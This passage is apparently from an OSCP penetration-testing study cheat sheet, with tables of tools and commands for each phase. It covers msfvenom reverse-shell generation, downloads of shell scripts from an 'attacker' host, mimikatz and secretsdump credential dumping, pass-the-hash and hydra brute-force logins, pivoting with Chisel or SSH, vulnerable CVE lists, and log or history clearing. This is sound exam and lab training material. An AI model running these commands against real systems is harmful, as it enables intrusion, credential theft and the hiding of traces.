|----------------|------------------------------------------|----------------|
| `msfvenom`     | Payload generation                        | `msfvenom -p windows/shell_reverse_tcp LHOST=attacker LPORT=4444 -f exe > shell.exe` |
| `Metasploit`   | Framework for exploitation                | `msfconsole → use exploit/multi/handler` |
| `ncat`         | Reverse shell handling                    | `ncat -lvnp 4444` |
| `python`       | Simple webserver                          | `python3 -m http.server 80` |
| `wget` / `curl`| File retrieval                            | `wget http://attacker/shell.sh` |
| `searchsploit` | Local exploit database search             | `searchsploit apache 2.4` |
| `nishang`      | PowerShell payloads                       | Import scripts for Windows shells |

## 🟠 4. Privilege Escalation
| Tool             | Purpose                                | Sample Command |
|------------------|----------------------------------------|----------------|
| `linpeas.sh`     | Linux privesc script                    | `./linpeas.sh` |
| `winPEAS.exe`    | Windows privesc script                  | `winPEASx64.exe` |
| `sudo -l`        | List sudo privileges                    | `sudo -l` |
| `pspy`           | Monitor Linux processes                 | `./pspy64` |
| `linux-exploit-suggester.sh` | Kernel exploit suggestions | `./linux-exploit-suggester.sh` |
| `windows-exploit-suggester.py` | Windows patch-based escalation | `python windows-exploit-suggester.py` |
| `mimikatz`       | Credential dumping on Windows           | `sekurlsa::logonpasswords` |

## 🔴 5. Post-Exploitation / Lateral Movement
| Tool             | Purpose                                | Sample Command |
|------------------|----------------------------------------|----------------|
| `wmiexec.py`     | Remote command execution via WMI       | `wmiexec.py user:pass@target` |
| `psexec.py`      | Run commands via SMB                   | `psexec.py user:pass@target` |
| `secretsdump.py` | Dump Windows hashes                    | `secretsdump.py user:pass@target` |
| `chisel`         | TCP tunneling / pivoting               | `chisel client attacker:9001 R:127.0.0.1:3389` |
| `responder`      | LLMNR poisoning                        | `responder -I eth0` |
| `BloodHound`     | AD enumeration via neo4j               | Use with `SharpHound` collector |

## 🟣 6. Reporting & Cleanup
| Tool              | Purpose                               | Sample Command |
|-------------------|---------------------------------------|----------------|
| `asciinema`       | Terminal session recording            | `asciinema rec` |
| `screenshot tools`| Capture flags / proof steps           | Manual or `gnome-screenshot` |
| `cherrytree`      | Reporting and note keeping            | GUI |
| `keepnote`        | Note organization                     | GUI |
| `rm`, `Clear-EventLog` | Clean traces (if allowed)        | Manual cleanup |

## Port tunneling and port redirection 
<img src="https://github.com/xasyhack/oscp2025/blob/main/images/port%20forward%20and%20tunneling.png" alt="" width="400"/>  

**Option 1: Port Redirection using socat (Simple)**  
Pivot machine A: socat TCP-LISTEN:8888,fork TCP:172.16.10.10:80  
Kali: curl http://10.10.10.5:8888  

**Option 2: SSH Tunneling - Local Forwarding (if SSH access on A)**  
kali: ssh -L 8888:172.16.10.10:80 user@10.10.10.5  
kali: curl http://localhost:8888  

**Option 3: Dynamic Proxy via SSH (SOCKS5)**  
kali: ssh -D 9050 user@10.10.10.5  
Edit /etc/proxychains.conf: socks5  127.0.0.1 9050  
kali: proxychains nmap -Pn -sT -p80 172.16.10.10  

| **Concept**                      | **You Want To...**                              | **Scenario**                                                                 | **Technique**                | **Command Example**                                                                                                                                       | **Notes**                                                                                  |
|----------------------------------|--------------------------------------------------|------------------------------------------------------------------------------|------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------|
| **Port Redirection using socat** | Access internal RDP/web from pivot host         | You compromised `10.10.10.5`, want to reach `172.16.5.10:3389` (RDP)         | socat TCP Port Forward       | `socat TCP-LISTEN:3389,fork TCP:172.16.5.10:3389` *(on pivot)*<br>`rdesktop 10.10.10.5:3389` *(on Kali)*                                                  | No encryption; simple TCP relay                                                            |
| **SSH Local Port Forwarding**    | Access internal web via tunnel                  | You have SSH on `10.10.10.5`, want to view `172.16.5.10:80`                  | `ssh -L` (local forward)     | `ssh -L 8888:172.16.5.10:80 user@10.10.10.5`<br>`curl http://localhost:8888` *(on Kali)*                                                                   | Great for web/DB services                                                                 |
| **SSH Remote Port Forwarding**   | Let victim connect back to you                 | Firewall blocks reverse shell directly, but allows SSH outbound              | `ssh -R` (reverse tunnel)    | `ssh -R 4444:localhost:4444 kali@your.kali.ip` *(on pivot)*<br>`nc -lvnp 4444` *(on Kali)*                                                                 | Good for shells from behind firewalls                                                      |
| **SSH Dynamic Proxy**            | Proxy tools through pivot host                 | You want to scan or browse internal network via `10.10.10.5`                | `ssh -D` (SOCKS5 Proxy)      | `ssh -D 9050 user@10.10.10.5` *(on Kali)*<br>Set `proxychains.conf`: `socks5 127.0.0.1 9050`<br>`proxychains nmap -Pn -sT 172.16.5.10`                    | Enables `proxychains`, Gobuster, browsers                                                  |
| **Chisel (Reverse Tunnel)**      | Pivot without SSH, e.g., Windows box           | Compromised host runs Chisel reverse client to you                          | Chisel SOCKS over reverse    | `chisel server -p 8000 --reverse` *(on Kali)*<br>`chisel client yourip:8000 R:1080:socks` *(on pivot)*                                                    | Useful on Windows without SSH                                                              |
| **iptables NAT (Linux pivot)**   | Route traffic via Linux box without tools      | You have root on a Linux pivot with `iptables`                              | Linux NAT Port Forward       | `iptables -t nat -A PREROUTING -p tcp --dport 3333 -j DNAT --to-destination 172.16.5.10:80` *(on pivot)*<br>`curl http://10.10.10.5:3333` *(on Kali)*     | Native but less flexible; requires root                                                    |

| **Step** | **Action**                          | **Command**                                                                                      | **Run on**        |
|----------|--------------------------------------|--------------------------------------------------------------------------------------------------|-------------------|
| 1        | Prepare Chisel binaries              | `wget ... && gunzip ... && chmod +x ...` (see full commands below)                              | Kali              |
| 2        | Start HTTP server to serve files     | `python3 -m http.server 80`                                                                      | Kali              |
| 3        | Download Chisel binary               | `wget http://<kali-ip>/chisel.elf` or PowerShell `Invoke-WebRequest`                            | Victim            |
| 4        | Start Chisel server (reverse mode)   | `./chisel.elf server -p 8000 --reverse`                                                          | Kali              |
| 5        | Start Chisel client (reverse tunnel) | `./chisel.elf client <kali-ip>:8000 R:1080:socks` <br> or `chisel.exe ...`                      | Victim            |
| 6        | Configure proxychains                 | Add `socks5 127.0.0.1 1080` in `/etc/proxychains.conf`                                           | Kali              |
| 7        | Use proxychains to access internal   | `proxychains nmap -Pn -sT -p80 172.16.10.10` <br> `proxychains curl http://172.16.10.10`         | Kali              |

## OSCP Vulnerable Software Versions Cheat Sheet
**Remote Exploits / Service Exploits**

| Software          | Vulnerable Version(s) | Exploit / CVE                           |
|------------------|------------------------|-----------------------------------------|
| Apache Tomcat    | 7.x < 7.0.81           | CVE-2017-12615 (PUT upload RCE)         |
| vsftpd           | 2.3.4                  | Backdoor RCE                            |
| Exim             | < 4.89                 | CVE-2019-10149 (Command Injection)      |
| ProFTPD          | 1.3.5                  | CVE-2015-3306 (mod_copy RCE)            |
| MySQL            | 5.5.5 (config issue)   | CVE-2012-2122 (Auth bypass)             |
| Apache httpd     | 2.2.x, 2.4.x (old)     | mod_ssl, mod_cgi RCEs                   |
| PHP              | < 5.6.x, < 7.1.x       | Unserialize RCE                         |
| Drupal           | 7.x / 8.x              | CVE-2018-7600 (Drupalgeddon 2)          |
| Jenkins          | 1.x / 2.x              | Script console RCE                      |
| Nagios XI        | Various                | Command Injection                       |
| Webmin           | 1.910                  | CVE-2019-15107 (Password change RCE)    |
| OpenSSH          | 7.2p2, 5.x             | CVE-2016-0777 (Key leak)                |
| Samba            | 3.x / 4.5.x            | CVE-2017-7494 (Writable share RCE)      |
| Django           | ≤ 1.2.1                | Template injection RCE                  |
| Windows SMB      | Win 7 / Server 2008    | CVE-2017-0144 (EternalBlue)             |
| FTP (anonymous)  | Misconfigured          | Upload shell access                     |
| WordPress        | ≤ 4.7.0                | REST API content injection              |
| phpMyAdmin       | ≤ 4.8.x                | Auth bypass / LFI                       |
| Elasticsearch    | < 1.6                  | CVE-2015-1427 (Groovy script RCE)       |
| DotNetNuke (DNN) | < 9.2                  | CVE-2017-9822 (Install RCE)             |

**Local Privilege Escalation**

| OS / Software     | Vulnerable Version(s) | Exploit / CVE                       |
|------------------|------------------------|-------------------------------------|
| Linux Kernel      | 2.6.32 – 4.4.x         | CVE-2016-5195 (DirtyCow)            |
| Linux Kernel      | ≤ 4.15                 | OverlayFS (Ubuntu)                 |
| Linux Kernel      | 2.6.37 – 5.x           | CVE-2022-0847 (DirtyPipe)           |
| Polkit (pkexec)   | ≤ 0.105                | CVE-2021-4034 (PwnKit)              |
| Sudo              | ≤ 1.8.25p1             | CVE-2019-14287 (Bypass)             |
| Cron              | Misconfigured          | PATH hijacking                      |
| /etc/passwd       | Writable               | Root shell via user change          |
| MySQL             | Running as root        | UDF-based privesc                   |
| NFS               | no_root_squash         | Root shell via mount                |
| Cron + writable   | Root cron job          | Privesc via script injection        |
| Windows: AlwaysInstallElevated | Enabled   | SYSTEM shell via .msi               |
| Windows: Service Path | Unquoted path      | Binary replacement                  |
| Windows: Weak perms| Modifiable service    | Replace exe                         |
| Windows: Token abuse | SeImpersonate enabled| Juicy Potato / Rogue Potato         |
| Windows: UAC bypass| Win 7 / 10            | fodhelper / sdclt                   |
| Windows: DLL Hijack| Misconfigured service | Load custom DLL as SYSTEM           |

**Sample SearchSploit Usage**
searchsploit vsftpd 2.3.4
searchsploit samba 3.0
searchsploit tomcat 7.0.81
searchsploit linux kernel 4.15

## Protocols login
| Protocol        | Port    | Tool                | Kali 2025 Login Command Example                                                                                      |
|-----------------|---------|---------------------|----------------------------------------------------------------------------------------------------------------------|
| **SSH**         | 22      | `ssh`               | `ssh user@10.10.10.10`                                                                                                |
|                 |         | `hydra`             | `hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10`                                               |
| **FTP**         | 21      | `ftp`               | `ftp 10.10.10.10`                                                                                                    |
|                 |         | `hydra`             | `hydra -l anonymous -p '' ftp://10.10.10.10`                                                                         |
| **Telnet**      | 23      | `telnet`            | `telnet 10.10.10.10`                                                                                                 |
|                 |         | `hydra`             | `hydra -l root -P /usr/share/wordlists/rockyou.txt telnet://10.10.10.10`                                              |
| **HTTP(S)**     | 80/443  | `hydra`             | `hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Incorrect"` |
| **SMB**         | 445     | `smbclient`         | `smbclient -L //10.10.10.10 -U user%password`                                                                         |
|                 |         | `smbmap`            | `smbmap -H 10.10.10.10 -u user -p password`                                                                           |
|                 |         | `crackmapexec`      | `crackmapexec smb 10.10.10.10 -u user -p password`                                                                    |
| **RDP**         | 3389    | `xfreerdp`          | `xfreerdp3 /v:10.10.10.10 /u:user /p:Pass123 /cert-ignore`                                                             |
|                 |         |                     | `xfreerdp3 /v:10.10.10.10 /u:user /pth:0123456789ABCDEF0123456789ABCDEF /cert-ignore`                                  |
| **WinRM**       | 5985    | `evil-winrm`        | `evil-winrm -i 10.10.10.10 -u Administrator -p Pass123`                                                               |
|                 |         |                     | `evil-winrm -i 10.10.10.10 -u Administrator -H AABBCCDDEEFF00112233445566778899`                                        |
|                 |         |                     | `evil-winrm -i 10.10.10.10 -u Administrator -p Pass123 -S`  (SSL mode)                                                 |
| **MySQL**       | 3306    | `mysql`             | `mysql -h 10.10.10.10 -u root -p`                                                                                      |
| **PostgreSQL**  | 5432    | `psql`              | `psql -h 10.10.10.10 -U postgres`                                                                                      |
| **MSSQL**       | 1433    | `impacket-mssqlclient.py` | `mssqlclient.py user@10.10.10.10 -windows-auth`                                                                    |
|                 |         |                     | `mssqlclient.py user@10.10.10.10 -windows-auth -hashes :<NTLM_HASH>`                                                   |
| **VNC**         | 5900    | `vncviewer`         | `vncviewer 10.10.10.10:5900`                                                                                           |
|                 |         | `hydra`             | `hydra -P /usr/share/wordlists/rockyou.txt -t 4 vnc://10.10.10.10`                                                    |
| **POP3**        | 110     | `hydra`             | `hydra -l user -P /usr/share/wordlists/rockyou.txt pop3://10.10.10.10`                                                 |
| **IMAP**        | 143     | `hydra`             | `hydra -l user -P /usr/share/wordlists/rockyou.txt imap://10.10.10.10`                                                 |
| **LDAP**        | 389     | `ldapsearch`        | `ldapsearch -x -h 10.10.10.10 -b "dc=example,dc=local"`                                                                |
| **SNMP**        | 161     | `snmpwalk`          | `snmpwalk -v2c -c public 10.10.10.10`                                                                                   |
| **NFS**         | 2049    | `showmount`         | `showmount -e 10.10.10.10`                                                                                             |
|                 |         | `mount`             | `mount -t nfs 10.10.10.10:/share /mnt`                                                                                 |

## OSCP Attack Vectors Checklist

| Category               | Attack Vector / Tool                             | Description / Use Case                         |
|------------------------|------------------------------------------------|-----------------------------------------------|
| **Host Discovery**     | `ping`, `fping`, `arp-scan`, `nmap -sn`        | Identify live hosts on network                 |
| **Port Scanning**      | `nmap -sS -sV -p-`, `rustscan`, `masscan`      | Discover open ports and running services       |
| **Service Enumeration**| `enum4linux`, `smbclient`, `smbmap`, `ldapsearch`, `rpcclient`, `snmpwalk`, `nikto`, `wpscan`, `gobuster`, `feroxbuster` | Enumerate SMB, LDAP, SNMP, HTTP services and web content |
| **Web Exploitation**   | SQL Injection (`sqlmap`), LFI/RFI, Command Injection, File Upload Bypass | Exploit web application vulnerabilities        |
| **Common Service Exploits** | FTP (anonymous login), SMB (EternalBlue), MSSQL/MySQL (xp_cmdshell, UDF), Redis (unauthenticated write), RDP (bruteforce) | Service-specific exploitation techniques        |
| **Tunneling & Pivoting**| SSH tunneling (`ssh -L/-R/-D`), tools like `chisel`, `ligolo`, `socat`, proxychains | Bypass network restrictions, access internal hosts |
| **Priv Esc (Linux)**   | `sudo -l`, SUID binaries, kernel exploits (Dirty COW, Dirty Pipe), writable cron/systemd | Escalate privileges on Linux systems            |
| **Priv Esc (Windows)** | AlwaysInstallElevated, Unquoted service paths, weak service perms, token impersonation (JuicyPotato) | Windows privilege escalation techniques          |
| **Credential Hunting** | Extract hashes from `/etc/shadow`, SAM; check bash history, config files | Find credentials for lateral movement or privilege escalation |

1. Host Discovery
- `ping`, `fping`, `arp-scan`
- `nmap -sn`

2. Port Scanning
- `nmap -sS -sV -p-`
- `rustscan`, `masscan`

3. Service Enumeration
- SMB: `enum4linux`, `smbclient`, `smbmap`, `crackmapexec`
- LDAP: `ldapsearch`, `ldapenum`
- SNMP: `snmpwalk`
- RPC: `rpcclient`
- HTTP/Web: `nikto`, `whatweb`, `wpscan`, `gobuster`, `feroxbuster`

4. Web Exploitation
- SQL Injection (Error, Blind, Time-based): `sqlmap`, manual payloads
- LFI/RFI and Path Traversal
- Command Injection
- File Upload Vulnerabilities
- CSRF, XSS (less common for OSCP)

5. Common Service Exploits
- FTP: anonymous login, weak creds
- SMB: EternalBlue, weak shares
- MSSQL/MySQL: xp_cmdshell, UDF uploads
- Redis: unauthenticated write
- RDP: brute-force with `hydra`, `ncrack`

6. Tunneling and Pivoting
- SSH tunneling: `ssh -L`, `-R`, `-D`
- Tools: `chisel`, `ligolo`, `socat`
- Proxychains setup and usage

7. Privilege Escalation (Linux)
- `sudo -l`
- SUID binaries
- Kernel exploits (e.g., Dirty COW, Dirty Pipe)
- Writable cron jobs / systemd services

8. Privilege Escalation (Windows)
- AlwaysInstallElevated policy
- Unquoted service paths
- Weak service permissions
- Token impersonation exploits (JuicyPotato, RottenPotato, etc.)

9. Credential Hunting
- `/etc/passwd`, `/etc/shadow`, SAM
- History files and config files
- Scripts or backups with credentials

## Kali setup
1. Register [Broadcom account](https://profile.broadcom.com/web/registration)
1. Download "VMware Workstation Pro"
1. Download [Kali VM](https://help.offsec.com/hc/en-us/articles/360049796792-Kali-Linux-Virtual-Machine)
1. Launching the VM (browse the .vmx file)
1. Login kali (🔒 username:kali, password:kali)
1. Kali terminal `sudo updatedb`
1. Download VPNs from OffSec portal (Explorer > VPN)
1. Connect to PWK Lab
   - `locate universal.ovpn`
   - `cd /home/kali/Downloads`
   - `mkdir /home/kali/offsec`
   - `mv universal.ovpn /home/kali/offsec/universal.ovpn`
   - `cd ../offsec`
   - `sudo openvpn universal.ovpn`
   - output reads "Initialization Sequence Completed"
   - disconnect VPN by pressing Ctrl+C
1. Package install
   - `sudo apt update`
   - `sudo apt install golang`
 1. Recommended software
    - Notetaking: [notion.so](http://notion.so)  or Obsidian
    - Scanning tool: [Rustscan](https://github.com/RustScan/RustScan/releases)  
      `dpkg -i rustscan_2.3.0_amd64.deb`
    - file upload/transfer purpose: Updog    
      ```  
      pip3 install updog  
      export PATH="/home/kali/.local/bin:$PATH"
      ```
    - Privilege Escalation: peass  
      `sudo apt install peass`
    - DNS: Gobuster  
      `sudo apt install gobuster`
    - Hosting a WebDAV share (for exploits, exfil, or testing): WsgiDAV  
      `sudo apt install wsgidav`
    - Lateral movement / privilege escalation: Bloodhound  
      `sudo apt update && sudo apt install -y bloodhound`
    - Stores AD data for querying & analysis: Neo4j  
      `sudo neo4j console`
    - Mimmikatz
      ```
      find ~/ -iname "mimikatz.exe"  
      ```

    ## Kali useful command
    - clean terminal history command: `bash` `history -c`
    - search history: history | grep dnf
